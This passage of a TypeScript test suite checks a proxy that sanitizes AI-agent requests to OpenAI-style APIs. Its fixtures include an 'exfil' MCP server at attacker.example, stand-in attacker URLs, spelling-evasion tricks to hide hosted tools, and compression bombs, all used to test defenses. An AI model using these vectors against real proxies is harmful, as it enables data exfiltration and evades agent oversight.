            { type: 'file', file: { filename: 'a.pdf', file_data: 'data:application/pdf;base64,JVBERi0=' } },
            { type: 'input_audio', input_audio: { data: 'UklGRg==', format: 'wav' } },
            { type: 'video_url', video_url: { url: 'https://attacker.example/v.mp4' } },
            { type: 'file_url', file_url: { url: 'https://attacker.example/f.pdf' } },
          ],
        },
        {
          role: 'tool',
          tool_call_id: 'call_1',
          content: [{ type: 'image_url', image_url: { url: 'http://x.example' } }],
        },
      ],
    });
    const messages = result.body.messages as Body[];
    expect(messages[0].content).toEqual([
      { type: 'text', text: 'see' },
      CHAT_PLACEHOLDER,
      { type: 'image_url', image_url: { url: 'data:image/png;base64,AAAA', detail: 'low' } },
      CHAT_PLACEHOLDER,
      CHAT_PLACEHOLDER,
      { type: 'file', file: { filename: 'a.pdf', file_data: 'data:application/pdf;base64,JVBERi0=' } },
      { type: 'input_audio', input_audio: { data: 'UklGRg==', format: 'wav' } },
      CHAT_PLACEHOLDER,
      CHAT_PLACEHOLDER,
    ]);
    expect(messages[1].content).toEqual([CHAT_PLACEHOLDER]);
    expect(result.removed).toEqual([
      'image_url:image_url.url',
      'image_url:image_url',
      'file:file.file_id',
      'content:video_url',
      'content:file_url',
      'image_url:image_url.url',
    ]);
    expect(JSON.stringify(result.removed)).not.toContain('attacker');
  });

  it.each([
    ['a missing model', { messages: [] }],
    ['an object messages field', { model: 'm', messages: { role: 'user', content: 'hi' } }],
    ['a non-object message', { model: 'm', messages: ['hi'] }],
    ['object content', { model: 'm', messages: [{ role: 'user', content: { type: 'image_url' } }] }],
    ['a non-object content part', { model: 'm', messages: [{ role: 'user', content: [['nested']] }] }],
    ['an object tools field', { model: 'm', tools: { type: 'web_search' } }],
  ])('rejects %s instead of forwarding it', (_label, body) => {
    expect(rejection(() => sanitizeChat(body)).status).toBe(400);
  });

  it('never mutates its input', () => {
    const body = {
      model: 'm',
      web_search_options: {},
      tools: [{ type: 'web_search' }],
      messages: [{ role: 'user', content: [{ type: 'image_url', image_url: { url: 'https://x.example' } }] }],
    };
    const before = structuredClone(body);
    sanitizeChat(body);
    expect(body).toEqual(before);
  });
});

// ─── Variant spellings of inspected fields ──────────────────────────────

/**
 * Each body hides a hosted tool or a URL under a spelling the sanitizer does
 * not read, but which an upstream with a case-insensitive JSON decoder would
 * (Go's encoding/json matches `Tools`, `TYPE` and even `tool\u017f`, with U+017F
 * folding to `s`, and the last spelling wins). The sanitizer refuses them.
 */
const VARIANT_SPELLINGS: [string, 'responses' | 'chat', Body][] = [
  [
    'a second tools list',
    'responses',
    { model: 'm', tools: [FUNCTION_TOOL], Tools: [{ type: 'mcp', server_url: 'https://attacker.example/mcp' }] },
  ],
  ['tools with a long s', 'responses', { model: 'm', 'tool\u017f': [{ type: 'web_search' }] }],
  ['a camelCase tool_choice', 'responses', { model: 'm', toolChoice: { type: 'web_search_preview' } }],
  ['an upper-case input', 'responses', { model: 'm', input: 'hi', INPUT: [userMessage(HTTP_IMAGE)] }],
  ['a prompt in another case', 'responses', { model: 'm', Prompt: { id: 'pmpt_1' } }],
  ['a second model', 'responses', { model: 'gpt-5.5', Model: 'gpt-4o-search-preview' }],
  ['a tool type', 'responses', { model: 'm', tools: [{ ...FUNCTION_TOOL, TYPE: 'web_search' }] }],
  [
    'a namespace member type',
    'responses',
    { model: 'm', tools: [{ ...MCP_NAMESPACE, tools: [{ ...FUNCTION_TOOL, Type: 'mcp' }] }] },
  ],
  [
    'a tool_search_output tool type',
    'responses',
    {
      model: 'm',
      input: [{ type: 'tool_search_output', execution: 'client', tools: [{ ...FUNCTION_TOOL, Type: 'web_search' }] }],
    },
  ],
  [
    'an item type',
    'responses',
    { model: 'm', input: [{ type: 'message', role: 'user', content: 'hi', Type: 'mcp_call' }] },
  ],
  [
    'item content',
    'responses',
    { model: 'm', input: [{ type: 'message', role: 'user', content: 'hi', Content: [HTTP_IMAGE] }] },
  ],
  [
    'tool output',
    'responses',
    { model: 'm', input: [{ type: 'function_call_output', call_id: 'c', output: 'ok', Output: [HTTP_IMAGE] }] },
  ],
  [
    'a part type',
    'responses',
    {
      model: 'm',
      input: [userMessage({ type: 'input_text', text: 'x', Type: 'input_image', image_url: HTTP_IMAGE.image_url })],
    },
  ],
  [
    'chat messages',
    'chat',
    {
      model: 'm',
      messages: [],
      Messages: [{ role: 'user', content: [{ type: 'image_url', image_url: { url: 'https://a.example' } }] }],
    },
  ],
  ['chat messages with long s', 'chat', { model: 'm', 'me\u017f\u017fages': [] }],
  ['a kebab-case web_search_options', 'chat', { model: 'm', 'web-search-options': { search_context_size: 'high' } }],
  [
    'a chat tool type',
    'chat',
    { model: 'm', tools: [{ type: 'function', function: { name: 'f' }, TYPE: 'web_search' }] },
  ],
  [
    'chat message content',
    'chat',
    {
      model: 'm',
      messages: [
        { role: 'user', content: 'hi', CONTENT: [{ type: 'image_url', image_url: { url: 'https://a.example' } }] },
      ],
    },
  ],
  [
    'a chat part type',
    'chat',
    {
      model: 'm',
      messages: [
        {
          role: 'user',
          content: [{ type: 'text', text: 'x', Type: 'image_url', image_url: { url: 'https://a.example' } }],
        },
      ],
    },
  ],
];

describe('variant spellings of inspected fields', () => {
  it.each(VARIANT_SPELLINGS)('refuses %s (%s)', (_label, protocol, body) => {
    const error = rejection(() => (protocol === 'responses' ? sanitizeResponses(body) : sanitizeChat(body)));
    expect(error.status).toBe(400);
    expect(error.message).toMatch(/differs only in spelling from one the proxy inspects/);
  });

  it('leaves fields it does not inspect alone, in any spelling', () => {
    // A JSON schema may name a property `Type`, and clients add fields of their own.
    const tool = {
      ...FUNCTION_TOOL,
      parameters: { type: 'object', properties: { Type: { type: 'string' }, TOOLS: { type: 'array' } } },
    };
    const responses = {
      model: 'm',
      Metadata: { Note: 'x' },
      tools: [tool],
      input: [userMessage({ type: 'input_text', text: 'x', Text: 'y' }), { type: 'function_call', Name: 'f' }],
    };
    expect(sanitizeResponses(responses).body).toBe(responses);
    const chat = { model: 'm', Temperature: 0, messages: [{ role: 'user', ROLE: 'x', content: 'hi' }] };
    expect(sanitizeChat(chat).body).toBe(chat);
  });
});

// ─── Request Content-Encoding ───────────────────────────────────────────

describe('request Content-Encoding', () => {
  it.each([
    [undefined, undefined],
    ['', undefined],
    ['identity', undefined],
    ['gzip', 'gzip'],
    ['x-gzip', 'gzip'],
    [' GZip ', 'gzip'],
    ['deflate', 'deflate'],
    ['br', 'br'],
    ['zstd', 'zstd'],
    ['identity, zstd', 'zstd'],
    [['zstd'], 'zstd'],
  ] as const)('parses %j as %j', (header, coding) => {
    expect(parseRequestContentCoding(header)).toBe(coding);
  });

  it.each([['compress'], ['exi'], ['gzip;q=1'], ['gzip, br'], ['zstd, zstd'], [['gzip', 'gzip']]] as const)(
    'refuses %j with 415',
    (header) => {
      const error = rejection(() => parseRequestContentCoding(header));
      expect(error.status).toBe(415);
      expect(error.message).toMatch(/^unsupported Content-Encoding: /);
    },
  );

  it.each(['gzip', 'deflate', 'br', 'zstd'] as const)('decodes %s', async (coding) => {
    const body = Buffer.from('{"model":"m"}');
    expect((await decodeRequestBody(compress(coding, body), coding, TEN_MB)).toString()).toBe('{"model":"m"}');
  });

  it('returns the body itself when there is no coding', async () => {
    const body = Buffer.from('{}');
    expect(await decodeRequestBody(body, undefined, TEN_MB)).toBe(body);
  });

  it.each(['gzip', 'deflate', 'br', 'zstd'] as const)(
    'answers corrupt or truncated %s data with 400',
    async (coding) => {
      expect((await asyncRejection(decodeRequestBody(Buffer.from('not compressed'), coding, TEN_MB))).status).toBe(400);
      const compressed = compress(coding, Buffer.from('{"model":"m","input":"a longer body"}'));
      const truncated = compressed.subarray(0, compressed.length - 4);
      expect((await asyncRejection(decodeRequestBody(truncated, coding, TEN_MB))).status).toBe(400);
    },
  );

  it.each(['gzip', 'deflate', 'br', 'zstd'] as const)(
    'answers a %s body that decodes past the limit with 413',
    async (coding) => {
      const bomb = compress(coding, Buffer.alloc(2 * 1024 * 1024));
      expect(bomb.length).toBeLessThan(64 * 1024);
      const error = await asyncRejection(decodeRequestBody(bomb, coding, 1024 * 1024));
      expect(error.status).toBe(413);
    },
  );

  it.each(['gzip', 'deflate', 'br', 'zstd'] as const)(
    'offers every decoded %s chunk to reserve before keeping it',
    async (coding) => {
      const body = Buffer.from(JSON.stringify({ model: 'm', input: 'x'.repeat(512 * 1024) }));
      const offered: number[] = [];
      const decoded = await decodeRequestBody(compress(coding, body), coding, TEN_MB, (bytes) => {
        offered.push(bytes);
        return true;
      });
      expect(decoded.equals(body)).toBe(true);
      expect(offered.length).toBeGreaterThan(1);
      expect(offered.reduce((sum, bytes) => sum + bytes, 0)).toBe(body.length);
    },
  );

  it.each(['gzip', 'deflate', 'br', 'zstd'] as const)(
    'stops decoding %s as soon as reserve refuses, long before the limit (WP-44 review)',
    async (coding) => {
      // A bomb that stays under the per-request limit: without the hook it decodes in full.
      const bomb = compress(coding, Buffer.alloc(8 * MIB));
      expect((await decodeRequestBody(bomb, coding, TEN_MB)).length).toBe(8 * MIB);

      let accepted = 0;
      let offered = 0;
      let largestChunk = 0;
      const error = await decodeRequestBody(bomb, coding, TEN_MB, (bytes) => {
        offered += bytes;
        largestChunk = Math.max(largestChunk, bytes);
        if (accepted + bytes > MIB) return false;
        accepted += bytes;
        return true;
      }).then(
        () => undefined,
        (rejected: unknown) => rejected,
      );
      expect(isDecodeBudgetExhaustedError(error)).toBe(true);
      expect(isRequestRejectedError(error)).toBe(false);
      expect(accepted).toBeLessThanOrEqual(MIB);
      // The decoder stopped at the first refused chunk: it never ran on toward 8 MiB.
      expect(offered).toBeLessThanOrEqual(MIB + largestChunk);
    },
  );

  it('still answers 413 past the limit and 400 for corrupt data when reserve accepts everything', async () => {
    const accept = (): boolean => true;
    const bomb = compress('gzip', Buffer.alloc(2 * MIB));
    expect((await asyncRejection(decodeRequestBody(bomb, 'gzip', MIB, accept))).status).toBe(413);
    expect((await asyncRejection(decodeRequestBody(Buffer.from('nope'), 'zstd', MIB, accept))).status).toBe(400);
  });

  it('refuses a zstd frame that demands a window larger than 16 MiB', async () => {
    async function frame(windowLog: number): Promise<Buffer> {
      // A streamed frame declares its window instead of sizing it to the content.
      const stream = zlib.createZstdCompress({ params: { [zlib.constants.ZSTD_c_windowLog]: windowLog } });
      const chunks: Buffer[] = [];
      stream.on('data', (chunk: Buffer) => chunks.push(chunk));
      const ended = new Promise((resolve) => stream.on('end', resolve));
      stream.end(Buffer.from('{"model":"m"}'));
      await ended;
      return Buffer.concat(chunks);
    }
    expect((await decodeRequestBody(await frame(24), 'zstd', TEN_MB)).toString()).toBe('{"model":"m"}');
    expect((await asyncRejection(decodeRequestBody(await frame(27), 'zstd', TEN_MB))).status).toBe(400);
  });

  it('clearContentEncoding removes every letter-case variant', () => {
    const headers = { 'content-encoding': 'zstd', 'Content-Encoding': 'gzip', 'content-type': 'application/json' };
    clearContentEncoding(headers);
    expect(headers).toEqual({ 'content-type': 'application/json' });
  });
});

// ─── Provider bindings ──────────────────────────────────────────────────

const zaiProfile: ResolvedZaiProfile = {
  type: 'zai',
  apiKey: 'host-only-key',
  model: 'glm-5.3',
  plan: 'api',
  modelMap: [{ match: '*', model: 'glm-5.3' }],
  usesDefaultMap: false,
  perAgent: { 'claude-code': undefined, codex: undefined, goose: undefined },
};

const openRouterProfile: GatewayProfile = {
  type: 'openrouter',
  apiKey: '',
  modelMap: [{ match: '*sonnet*', model: 'z-ai/glm-5.2' }],
  usesDefaultMap: false,
  perAgent: { 'claude-code': undefined, codex: undefined, goose: undefined },
  sessionAffinity: false,
};

// ─── OpenAI's own routes: models that search the web ────────────────────

describe("openai-platform layer: web-search models on OpenAI's own routes", () => {
  const ROUTES = [
    [openaiProvider, '/v1/chat/completions', { messages: [{ role: 'user', content: 'What happened today?' }] }],
    [openaiProvider, '/v1/responses', { input: 'What happened today?' }],
    // Every Codex session reaches OpenAI by this route, and a process in the
    // container can name any model on it.
    [codexChatGptProvider, '/backend-api/codex/responses', { input: 'What happened today?' }],
  ] as const;

  const SEARCH_MODELS = [
    'gpt-4o-search-preview',
    'gpt-4o-search-preview-2025-03-11',
    'gpt-4o-mini-search-preview',
    'gpt-4o-mini-search-preview-2025-03-11',
    'gpt-5-search-api',
    'gpt-5-search-api-2025-10-14',
    'o3-deep-research',
    'o3-deep-research-2025-06-26',
    'o4-mini-deep-research',
    // Compared trimmed and case-folded (U+017F folds to s).
    ' GPT-4o-Search-Preview ',
    'gpt-4o-\u017fearch-preview',
  ];

  function boundTo(config: ProviderConfig, path: string) {
    const sanitizer = resolveRequestSanitizer(config, 'POST', path);
    if (sanitizer === undefined) throw new Error(`no sanitizer is bound to ${config.host}${path}`);
    return sanitizer;
  }

  it.each(
    ROUTES.flatMap(([config, path, body]) =>
      SEARCH_MODELS.map((model) => [`${config.host}${path}`, model, config, path, body] as const),
    ),
  )('%s refuses the web-search model %j', (_route, model, config, path, body) => {
    const error = rejection(() => boundTo(config, path).sanitizeBody({ model, ...body }, { method: 'POST', path }));
    expect(error.status).toBe(400);
    expect(error.message).toContain('searches the web on every request');
  });

  it.each(ROUTES.map(([config, path, body]) => [`${config.host}${path}`, config, path, body] as const))(
    '%s forwards an ordinary model unchanged (same object)',
    (_route, config, path, body) => {
      for (const model of ['gpt-4o', 'gpt-4o-mini', 'gpt-4.1', 'gpt-5.5', 'o3', 'o4-mini', 'gpt-5.3-codex']) {
        const request = { model, ...body };
        const result = boundTo(config, path).sanitizeBody(request, { method: 'POST', path });
        expect(result.body, model).toBe(request);
        expect(result.removed, model).toEqual([]);
      }
    },
  );

  it('refuses a model that is not a string before anything else runs', () => {
    for (const model of [undefined, null, 42, ['gpt-4o-search-preview'], { id: 'gpt-4o-search-preview' }]) {
      const error = rejection(() => openaiPlatformSanitizer.sanitizeBody({ model }, CHAT_CTX));
      expect(error.message, JSON.stringify(model)).toBe('the request must name its model as a string');
    }
  });

  it('leaves the model to the gateway on other routes: OpenRouter keeps its profile-mapped exception', () => {
    // The protocol sanitizers do not judge the model (Z.AI and OpenRouter reuse them).
    const request = { model: 'gpt-4o-search-preview', messages: [{ role: 'user', content: 'hi' }] };
    expect(sanitizeChat(request).body).toBe(request);
    const profile: GatewayProfile = {
      ...openRouterProfile,
      modelMap: [{ match: 'research', model: 'openai/gpt-4o-search-preview' }],
    };
    const config = makeGatewayProvider(profile, 'chat', 'goose');
    const path = '/api/v1/chat/completions';
    const bound = resolveRequestSanitizer(config, 'POST', path);
    expect(bound?.protocol).toBe('openrouter+openai-chat-completions');
    const mapped = { model: 'openai/gpt-4o-search-preview', messages: [{ role: 'user', content: 'hi' }] };
    expect(bound?.sanitizeBody(mapped, { method: 'POST', path }).body).toBe(mapped);
  });
});

describe('OpenAI sanitizer bindings', () => {
  it('registers both OpenAI protocols', () => {
    expect(requestSanitizerFor('openai-responses')).toBe(openaiResponsesSanitizer);
    expect(requestSanitizerFor('openai-chat-completions')).toBe(openaiChatCompletionsSanitizer);
  });

  it.each([
    ['Z.AI responses (Codex)', makeZaiProvider(zaiProfile, 'codex'), '/api/v1/responses', openaiResponsesSanitizer],
    [
      'Z.AI chat, API plan (Goose)',
      makeZaiProvider(zaiProfile, 'goose'),
      '/api/paas/v4/chat/completions',
      openaiChatCompletionsSanitizer,
    ],
    [
      'Z.AI chat, Coding Plan (Goose)',
      makeZaiProvider({ ...zaiProfile, plan: 'coding' }, 'goose'),
      '/api/coding/paas/v4/chat/completions',
      openaiChatCompletionsSanitizer,
    ],
  ])('%s is sanitized', (_label, config, path, sanitizer) => {
    expect(resolveRequestSanitizer(config, 'POST', path)).toBe(sanitizer);
    expect(resolveRequestSanitizer(config, 'POST', `${path}?client_version=1`)).toBe(sanitizer);
    expect(resolveRequestSanitizer(config, 'GET', path)).toBeUndefined();
  });

  it.each([
    [
      'api.openai.com responses',
      openaiProvider,
      '/v1/responses',
      openaiResponsesSanitizer,
      { input: 'hi', tools: [FUNCTION_TOOL, { type: 'web_search' }] },
    ],
    [
      'api.openai.com chat',
      openaiProvider,
      '/v1/chat/completions',
      openaiChatCompletionsSanitizer,
      { messages: [{ role: 'user', content: 'hi' }], tools: [CHAT_FUNCTION, { type: 'web_search' }] },
    ],
    [
      'chatgpt.com (Codex)',
      codexChatGptProvider,
      '/backend-api/codex/responses',
      openaiResponsesSanitizer,
      { input: 'hi', tools: [FUNCTION_TOOL, { type: 'web_search' }] },
    ],
  ])('%s is sanitized behind the openai-platform layer', (_label, config, path, sanitizer, body) => {
    const bound = resolveRequestSanitizer(config, 'POST', path);
    expect(bound?.protocol).toBe(`openai-platform+${sanitizer.protocol}`);
    expect(resolveRequestSanitizer(config, 'POST', `${path}?client_version=1`)).toBe(bound);
    expect(resolveRequestSanitizer(config, 'GET', path)).toBeUndefined();
    // Both layers run: the model check first, then the protocol's hosted tools.
    const result = bound?.sanitizeBody({ model: 'gpt-4o', ...body }, { method: 'POST', path });
    expect(result?.body).toEqual({ model: 'gpt-4o', ...body, tools: [body.tools[0]] });
    expect(result?.removed).toEqual(['tool:web_search']);
    expect(() => bound?.sanitizeBody({ model: 'gpt-4o-search-preview', ...body }, { method: 'POST', path })).toThrow(
      /searches the web on every request/,
    );
  });

  it.each([
    [
      'OpenRouter responses (Codex)',
      makeGatewayProvider(openRouterProfile, 'responses', 'codex'),
      '/api/v1/responses',
      openaiResponsesSanitizer,
      { input: 'hi', tools: [FUNCTION_TOOL, { type: 'web_search' }] },
    ],
    [
      'OpenRouter chat (Goose)',
      makeGatewayProvider(openRouterProfile, 'chat', 'goose'),
      '/api/v1/chat/completions',
      openaiChatCompletionsSanitizer,
      { messages: [{ role: 'user', content: 'hi' }], tools: [CHAT_FUNCTION, { type: 'web_search' }] },
    ],
  ])('%s is sanitized behind the OpenRouter layer', (_label, config, path, sanitizer, body) => {
    const bound = resolveRequestSanitizer(config, 'POST', path);
    expect(bound?.protocol).toBe(`openrouter+${sanitizer.protocol}`);
    expect(resolveRequestSanitizer(config, 'POST', `${path}?client_version=1`)).toBe(bound);
    expect(resolveRequestSanitizer(config, 'GET', path)).toBeUndefined();
    // Both layers run: OpenRouter's own egress fields first, then the protocol's hosted tools.
    const result = bound?.sanitizeBody(
      { model: 'openai/gpt-4o', plugins: [{ id: 'web' }], ...body },
      { method: 'POST', path },
    );
    expect(result?.body).toEqual({ model: 'openai/gpt-4o', ...body, tools: [body.tools[0]] });
    expect(result?.removed).toEqual(['plugins', 'tool:web_search']);
  });

  it('leaves housekeeping endpoints unsanitized', () => {
    expect(resolveRequestSanitizer(codexChatGptProvider, 'GET', '/backend-api/codex/models')).toBeUndefined();
    expect(resolveRequestSanitizer(codexChatGptProvider, 'POST', '/codex-backend/agent-identity')).toBeUndefined();
    expect(resolveRequestSanitizer(openaiProvider, 'GET', '/v1/models')).toBeUndefined();
  });
});

// ─── End to end through the real MITM ───────────────────────────────────

const FAKE_KEY = 'sk-ironcurtain-sentinel-key';
const REAL_KEY = 'host-only-real-key';

describe('OpenAI request sanitization through the MITM', () => {
  let tempDir: string;
  let ca: CertificateAuthority;
  let socketPath: string;
  let proxy: MitmProxy | undefined;
  let upstream: FakeUpstream | undefined;

  beforeEach(() => {
    tempDir = mkdtempSync(join(tmpdir(), 'request-sanitizer-openai-'));
    ca = loadOrCreateCA(join(tempDir, 'ca'));
    socketPath = join(tempDir, 'mitm.sock');
  });

  afterEach(async () => {
    logger.teardown();
    await proxy?.stop();
    proxy = undefined;
    if (upstream) {
      const server = upstream.server;
      await new Promise<void>((resolve) => server.close(() => resolve()));
    }
    upstream = undefined;
    if (existsSync(tempDir)) rmSync(tempDir, { recursive: true, force: true });
  });

  async function startProxy(config: ProviderConfig): Promise<void> {
    upstream = await createFakeUpstream();
    proxy = createMitmProxy({
      socketPath,
      ca,
      dnsLookup: localhostDnsLookup,
      allowPrivateDestinationsForTests: true,
      providers: [
        {
          config: {
            ...config,
            upstreamTarget: { hostname: '127.0.0.1', port: upstream.port, pathPrefix: '', useTls: false },
          },
          fakeKey: FAKE_KEY,
          realKey: REAL_KEY,
        },
      ],
    });
    await proxy.start();
  }

  async function post(
    host: string,
    path: string,
    body: string | Buffer | Body,
    headers: Record<string, string>,
  ): Promise<HttpsResponse> {
    const { socket, statusCode } = await sendConnect(socketPath, host, 443);
    expect(statusCode).toBe(200);
    return makeHttpsRequest(socket as Socket, ca, host, {
      method: 'POST',
      path,
      headers: { 'content-type': 'application/json', ...headers },
      body: typeof body === 'string' || Buffer.isBuffer(body) ? body : JSON.stringify(body),
    });
  }

  function requests() {
    return upstream?.requests() ?? [];
  }

  const CODEX_AUTH = { authorization: `Bearer ${FAKE_KEY}` };

  /** The recorded Codex request plus every other hosted-egress vector of the acceptance criteria. */
  const hostileCodexRequest: Body = {
    ...CODEX_REQUEST,
    tools: [
      ...listOf(CODEX_REQUEST, 'tools'),
      { type: 'mcp', server_label: 'exfil', server_url: 'https://attacker.example/mcp', require_approval: 'never' },
      { type: 'image_generation' },
    ],
    tool_choice: { type: 'mcp', server_label: 'exfil' },
    input: [
      ...listOf(CODEX_REQUEST, 'input'),
      { type: 'mcp_approval_response', approval_request_id: 'mcpr_1', approve: true },
      userMessage(HTTP_IMAGE),
    ],
  };

  it('chatgpt.com: strips hosted tools, a hosted tool_choice, a replayed MCP approval and a URL image from a Codex request', async () => {
    const logFilePath = join(tempDir, 'session.log');
    logger.setup({ logFilePath });
    await startProxy(codexChatGptProvider);
    const response = await post('chatgpt.com', '/backend-api/codex/responses', hostileCodexRequest, CODEX_AUTH);
    expect(response.statusCode).toBe(200);

    const forwarded = requests()[0];
    // The hosted tool_choice is removed entirely, so the provider default applies.
    const expected = Object.fromEntries(
      Object.entries(withoutWebSearch(CODEX_REQUEST)).filter(([field]) => field !== 'tool_choice'),
    );
    expect(forwarded.body).toEqual({
      ...expected,
      input: [...listOf(CODEX_REQUEST, 'input'), userMessage(INPUT_PLACEHOLDER)],
    });
    expect(forwarded.rawBody).not.toContain('attacker.example');
    expect(forwarded.headers.authorization).toBe(`Bearer ${REAL_KEY}`);
    expect(readFileSync(logFilePath, 'utf-8')).toContain(
      'openai-responses sanitizer removed: tool:web_search, tool:mcp, tool:image_generation, tool_choice:mcp, ' +
        'input:mcp_approval_response, input_image:image_url',
    );
  });

  it.each(['zstd', 'gzip', 'br'] as const)(
    'chatgpt.com: decodes a %s-compressed Codex request, sanitizes it and forwards plain JSON',
    async (coding) => {
      await startProxy(codexChatGptProvider);
      const response = await post(
        'chatgpt.com',
        '/backend-api/codex/responses',
        compress(coding, wire(CODEX_REQUEST)),
        {
          ...CODEX_AUTH,
          'content-encoding': coding,
        },
      );
      expect(response.statusCode).toBe(200);
      const forwarded = requests()[0];
      expect(forwarded.headers['content-encoding']).toBeUndefined();
      expect(forwarded.headers['content-type']).toBe('application/json');
      expect(forwarded.headers['content-length']).toBe(String(Buffer.byteLength(forwarded.rawBody)));
      expect(forwarded.body).toEqual(withoutWebSearch(CODEX_REQUEST));
    },
  );

  it('chatgpt.com: forwards a zstd request from Codex with web search disabled as its exact decoded bytes', async () => {
    const logFilePath = join(tempDir, 'session.log');
    logger.setup({ logFilePath });
    await startProxy(codexChatGptProvider);
    const raw = wire(withoutWebSearch(CODEX_REQUEST));
    const response = await post('chatgpt.com', '/backend-api/codex/responses', compress('zstd', raw), {
      ...CODEX_AUTH,
      'content-encoding': 'zstd',
    });
    expect(response.statusCode).toBe(200);
    expect(requests()[0].rawBody).toBe(raw.toString());
    const log = readFileSync(logFilePath, 'utf-8');
    expect(log).toContain('decoded zstd request body');
    expect(log).not.toContain('sanitizer removed');
  });

  it.each([
    ['corrupt zstd data', 'zstd', Buffer.from('not zstd at all'), 400],
    ['an unknown coding', 'compress', Buffer.from('{}'), 415],
    ['stacked codings', 'gzip, zstd', zlib.zstdCompressSync(zlib.gzipSync(Buffer.from('{}'))), 415],
  ] as const)('answers %s locally and never contacts the upstream', async (_label, coding, body, status) => {
    await startProxy(codexChatGptProvider);
    const response = await post('chatgpt.com', '/backend-api/codex/responses', body, {
      ...CODEX_AUTH,
      'content-encoding': coding,
    });
    expect(response.statusCode).toBe(status);
    const error = JSON.parse(response.body) as { error: { message: string } };
    expect(error.error.message).toMatch(/^IronCurtain proxy refused this request: /);
    expect(requests()).toHaveLength(0);
  });

  it('chatgpt.com and api.openai.com buffer up to OpenAI’s documented 50 MB request payload', () => {
    // WP-44 raised the buffered-body limit from a flat 10 MB to each
    // provider's documented request limit; it applies raw and once decoded.
    expect(codexChatGptProvider.maxRequestBodyBytes).toBe(50 * MIB);
    expect(openaiProvider.maxRequestBodyBytes).toBe(50 * MIB);
  });

  it('chatgpt.com: answers a zstd body that decodes past the provider limit with 413 and never contacts the upstream', async () => {
    // The limit applies to the decoded body too; a small per-provider limit
    // keeps the fixture light (the 50 MB default is checked above).
    await startProxy({ ...codexChatGptProvider, maxRequestBodyBytes: MIB });
    const body = zlib.zstdCompressSync(Buffer.alloc(MIB + 1));
    expect(body.length).toBeLessThan(MIB);
    const response = await post('chatgpt.com', '/backend-api/codex/responses', body, {
      ...CODEX_AUTH,
      'content-encoding': 'zstd',
    });
    expect(response.statusCode).toBe(413);
    const error = JSON.parse(response.body) as { error: { message: string } };
    expect(error.error.message).toMatch(/^IronCurtain proxy refused this request: .*once decoded/);
    expect(requests()).toHaveLength(0);
  });

  it('chatgpt.com: forwards a zstd body that decodes past the old 10 MB limit', async () => {
    // A long Codex session with an inline screenshot: valid JSON over 10 MB once decoded.
    await startProxy(codexChatGptProvider);
    const request = withoutWebSearch(CODEX_REQUEST);
    const screenshot = { ...DATA_IMAGE, image_url: `data:image/png;base64,${'A'.repeat(11 * MIB)}` };
    const raw = wire({ ...request, input: [...listOf(request, 'input'), userMessage(screenshot)] });
    expect(raw.length).toBeGreaterThan(TEN_MB);
    const response = await post('chatgpt.com', '/backend-api/codex/responses', compress('zstd', raw), {
      ...CODEX_AUTH,
      'content-encoding': 'zstd',
    });
    expect(response.statusCode).toBe(200);
    expect(requests()).toHaveLength(1);
    expect(requests()[0].rawBody === raw.toString()).toBe(true);
  });

  it('chatgpt.com: refuses a hosted tool hidden under a variant spelling and never contacts the upstream', async () => {
    await startProxy(codexChatGptProvider);
    const hidden = { ...CODEX_REQUEST, tools: [...listOf(CODEX_REQUEST, 'tools'), { ...FUNCTION_TOOL, TYPE: 'mcp' }] };
    const response = await post('chatgpt.com', '/backend-api/codex/responses', hidden, CODEX_AUTH);
    expect(response.statusCode).toBe(400);
    const error = JSON.parse(response.body) as { error: { message: string } };
    expect(error.error.message).toContain('a tool has a field "TYPE"');
    expect(requests()).toHaveLength(0);
  });

  it.each([
    ['an agent-supplied key', { authorization: 'Bearer sk-agent-owned-key' }],
    ['no credential', {}],
  ])(
    'chatgpt.com: answers requests carrying %s with a local 401 and never contacts the upstream',
    async (_label, credential: Record<string, string>) => {
      await startProxy(codexChatGptProvider);
      const response = await post('chatgpt.com', '/backend-api/codex/responses', CODEX_REQUEST, credential);
      expect(response.statusCode).toBe(401);
      const error = JSON.parse(response.body) as { error: { type: string; message: string } };
      expect(error.error.type).toBe('authentication_error');
      expect(requests()).toHaveLength(0);
    },
  );

  it('api.openai.com: sanitizes /v1/responses and /v1/chat/completions', async () => {
    await startProxy(openaiProvider);
    const auth = { authorization: `Bearer ${FAKE_KEY}` };
    const responses = await post(
      'api.openai.com',
      '/v1/responses',
      { model: 'gpt-5.5', input: 'hi', tools: [FUNCTION_TOOL, { type: 'web_search_preview' }] },
      auth,
    );
    expect(responses.statusCode).toBe(200);
    expect(requests()[0].body).toEqual({ model: 'gpt-5.5', input: 'hi', tools: [FUNCTION_TOOL] });

    const chat = await post(
      'api.openai.com',
      '/v1/chat/completions',
      { ...GOOSE_CHAT_REQUEST, web_search_options: {}, tools: [CHAT_FUNCTION, { type: 'web_search' }] },
      auth,
    );
    expect(chat.statusCode).toBe(200);
    expect(requests()[1].body).toEqual(GOOSE_CHAT_REQUEST);
    expect(requests()[1].headers.authorization).toBe(`Bearer ${REAL_KEY}`);
  });

  it('api.openai.com: refuses a web-search model on both routes and never contacts the upstream', async () => {
    const logFilePath = join(tempDir, 'session.log');
    logger.setup({ logFilePath });
    await startProxy(openaiProvider);
    const auth = { authorization: `Bearer ${FAKE_KEY}` };
    const refused = [
      ['/v1/chat/completions', { model: 'gpt-4o-search-preview', messages: [{ role: 'user', content: 'news?' }] }],
      ['/v1/chat/completions', { model: 'gpt-5-search-api', messages: [{ role: 'user', content: 'news?' }] }],
      ['/v1/responses', { model: 'o3-deep-research', input: 'news?' }],
    ] as const;
    for (const [path, body] of refused) {
      const response = await post('api.openai.com', path, body, auth);
      expect(response.statusCode, body.model).toBe(400);
      const error = JSON.parse(response.body) as { error: { message: string } };
      expect(error.error.message).toBe(
        `IronCurtain proxy refused this request: model "${body.model}" searches the web on every request, ` +
          'which the proxy does not forward; use a model without built-in web search',
      );
    }
    expect(requests()).toHaveLength(0);
    expect(readFileSync(logFilePath, 'utf-8')).toContain(
      'REJECTED POST api.openai.com/v1/chat/completions - model "gpt-4o-search-preview" searches the web',
    );

    // An ordinary model is forwarded as sent.
    const chat = await post('api.openai.com', '/v1/chat/completions', GOOSE_CHAT_REQUEST, auth);
    expect(chat.statusCode).toBe(200);
    expect(requests()).toHaveLength(1);
    expect(requests()[0].rawBody).toBe(JSON.stringify(GOOSE_CHAT_REQUEST));
  });

  it('chatgpt.com: refuses a Codex request naming a web-search model, compressed too, and never contacts the upstream', async () => {
    const logFilePath = join(tempDir, 'session.log');
    logger.setup({ logFilePath });
    await startProxy(codexChatGptProvider);
    for (const model of ['gpt-5-search-api', 'o3-deep-research', 'gpt-4o-search-preview']) {
      const raw = wire({ ...withoutWebSearch(CODEX_REQUEST), model });
